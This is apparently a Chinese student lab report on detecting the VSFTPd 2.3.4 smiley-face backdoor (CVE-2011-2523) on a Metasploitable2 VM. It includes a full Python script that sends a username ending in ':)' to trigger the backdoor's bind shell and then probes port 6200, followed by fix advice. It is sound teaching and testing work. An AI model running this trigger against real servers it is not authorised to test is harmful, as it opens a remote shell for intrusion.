---
title: 网络渗透测试作业：笑脸漏洞（VSFTPd 2.3.4 后门 CVE-2011-2523）检测实验报告
date: 2026-11-03 17:40:00
categories:
  - 学习笔记
tags:
  - 网络安全
  - 网络渗透测试
---

> 声明：本文仅为授权实验环境下的学习记录，所有操作均在本地虚拟机中进行，未对任何未授权目标进行测试。

## 一、漏洞简介
- **CVE 编号**：CVE-2011-2523，影响 **VSFTPd 2.3.4**。
- **成因**：该版本源码被恶意植入后门。当 FTP 登录的用户名中包含 `:)`（笑脸）时，服务端会在 **6200 端口**开启一个后门 shell（bind shell）。
- **危害**：攻击者可借此获得目标系统的命令执行权限。
- **命名由来**：触发关键字正是笑脸 `:)`，因此俗称"笑脸漏洞"。

## 二、实验环境
- **攻击机**：Kali Linux
- **靶机**：Metasploitable2（内置存在该漏洞的 VSFTPd 2.3.4）
- **网络**：VMware Host-only，攻击机与靶机同网段
- **工具**：Python3（自写检测 PoC）、nmap

## 三、漏洞原理
VSFTPd 2.3.4 在收到含有 `:)` 的用户名后，会派生（fork）一个监听 6200 端口的 shell 进程。
因此**检测思路**分两步：
1. 连接 21 端口读取 FTP banner，判断版本是否为 `vsftpd 2.3.4`；
2. 发送含 `:)` 的用户名触发后门，再探测 6200 端口是否可连接。若可连接，则后门真实存在。

## 四、PoC 源码（Python）
下图为本实验 PoC 在 nano 编辑器中的截图（早期固定凭证版本）；本次实际运行使用的是**随机凭证版本**（与课堂演示一致：用户名 = 随机前缀 + `:)`，密码随机），源码如下（与运行结果完全一致）：

![源码截图（nano 编辑器）](/img/03_source_code.png)

```python
#!/usr/bin/env python3
# 笑脸漏洞 检测 PoC —— VSFTPd 2.3.4 后门 (CVE-2011-2523)
# 仅用于授权实验环境，检测目标是否存在该后门，不执行破坏性操作
import socket, sys, time, random, string

FTP_PORT = 21
BACKDOOR_PORT = 6200

def grab_banner(host):
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, FTP_PORT))
    banner = s.recv(1024).decode(errors='ignore').strip()
    s.close()
    return banner

def probe_backdoor(host):
    # 触发后门：用户名含 ':)' 即可，前缀和密码都用随机值（和老师课堂演示一致）
    user = ''.join(random.choices(string.ascii_lowercase, k=6)) + ':)'
    pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    print(f"[*] 测试账号 USER={user}  PASS={pwd}（注意 ':' 在用户名里，密码随意）")
    try:
        f = socket.socket(); f.settimeout(5); f.connect((host, FTP_PORT))
        f.recv(1024)
        f.send(f"USER {user}\r\n".encode()); time.sleep(0.3); f.recv(1024)
        f.send(f"PASS {pwd}\r\n".encode()); time.sleep(1); f.close()
    except Exception as e:
        print(f"[-] 触发阶段: {e}")
    time.sleep(1)
    try:
        b = socket.socket(); b.settimeout(3); b.connect((host, BACKDOOR_PORT))
        b.close()
        return True
    except Exception:
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)
    host = sys.argv[1]
    print(f"[*] Detecting {host} ...")
    banner = grab_banner(host)
    print(f"[+] FTP Banner: {banner}")
    if "vsftpd 2.3.4" in banner:
        print("[!] Version is vsftpd 2.3.4, possible smiley backdoor")
    else:
        print("[*] Version is not 2.3.4, basically excluded")
    if probe_backdoor(host):
        print("[!!!!] Port 6200 connectable => backdoor is REAL! Vulnerability confirmed.")
    else:
        print("[-] Port 6200 not open => backdoor not triggered or patched")
```

代码逻辑：
- `grab_banner()`：连接靶机 21 端口，读取并回显 FTP banner；
- `probe_backdoor()`：生成随机用户名（末尾带 `:)`）与随机密码，发送 `USER`/`PASS` 触发后门，等待后尝试连接 6200 端口，成功即判定后门存在；
- 主程序先报版本，再探测 6200，输出最终结论。

## 五、测试过程与结果
### 1. 端口与版本探测（nmap）
先确认靶机 21 端口运行的是存在漏洞的 `vsftpd 2.3.4`：

![nmap 扫描结果](/img/02_nmap.png)

### 2. 运行检测 PoC
执行 `python3 smiley_poc.py <靶机IP>`，使用随机凭证触发并探测：

![PoC 运行结果](/img/01_run_result.png)

**结果**：FTP banner 确认为 `vsftpd 2.3.4`，且触发后 6200 端口可成功连接，**漏洞确认存在**。

## 六、修复建议
- 升级 VSFTPd 到安全版本，或移除/替换受影响的 2.3.4；
- 仅从官方或可信源下载软件，并校验文件完整性，避免被植入后门；
- 生产环境关闭不必要的 FTP 服务，用防火墙限制端口暴露面。

## 附：截图打码说明
- **无需打码**：内网实验 IP（如 `192.168.x.x`）、PoC 源码、漏洞技术细节与命令输出。
- **需要打码**：终端提示符中的真实用户名/主机名、任何公网 IP、真实账号密码。
- 提示：本文三张截图里的终端用户名（如 `qfbsz`）建议在正式发布前打码处理。
